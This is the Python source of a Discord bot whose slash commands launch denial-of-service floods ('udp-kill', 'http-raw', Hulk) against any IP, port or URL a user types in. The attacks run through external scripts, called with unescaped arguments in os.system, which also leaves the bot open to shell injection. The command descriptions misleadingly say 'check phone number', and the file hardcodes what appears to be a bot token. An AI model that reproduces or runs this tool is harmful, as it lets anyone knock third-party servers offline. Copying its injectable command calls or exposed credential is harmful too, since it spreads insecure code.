import discord
import discord
import requests, json
import random, os, time
from requests import post,Session
from discord.ext import commands
from discord import app_commands
from discord.utils import get
intents = discord.Intents.default()
#intents = discord.Intents.all()
intents.messages = True
intents.typing = False
intents.presences = False
bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)
######################################

id_room= 1061463632824770640
token= "MTA2NzI3NDAwMTE2NjExMDgwMA.GKyI8z.VMSRsRoAgr1iEDRSN1D6KRevNDoCaDJWVgj4CQ"


######################################
@bot.event
async def on_ready():
  os.system("clear")
  await tree.sync(guild=discord.Object(id=id_room))
  os.system("clear")
  print("                         Bot Ready!")
  print(f"""    Đang Kết Nối Với Máy Chủ : {bot.user}""")
  
  
  
@tree.command(name = "udp-kill", description = "KIỂM TRA SỐ ĐIỆN THOẠI", guild=discord.Object(id=id_room))
async def start(ctx,ip:str,port:int,threads:int,time:int):
  embes = discord.Embed(title="Đang Tấn Công nhé", color=discord.Colour.random())
  await ctx.response.send_message(embed=embes)
  os.system(f'perl UDP-KILL.pl {ip} {port} {threads} {time}')
  
@tree.command(name = "http-raw", description = "KIỂM TRA SỐ ĐIỆN THOẠI", guild=discord.Object(id=id_room))
async def start(ctx,url:str,time:int):
  embes = discord.Embed(title="Đang Tấn Công nhé", color=discord.Colour.random())
  await ctx.response.send_message(embed=embes)
  os.system(f'node HTTP-RAW.js {url} {time}')


@tree.command(name = "udp-kill", description = "KIỂM TRA SỐ ĐIỆN THOẠI", guild=discord.Object(id=id_room))
async def start(ctx,url:str):
  embes = discord.Embed(title="Đang Tấn Công nhé", color=discord.Colour.random())
  await ctx.response.send_message(embed=embes)
  os.system(f'go run Hulk.go -site {url} -data GET')
  
bot.run(token)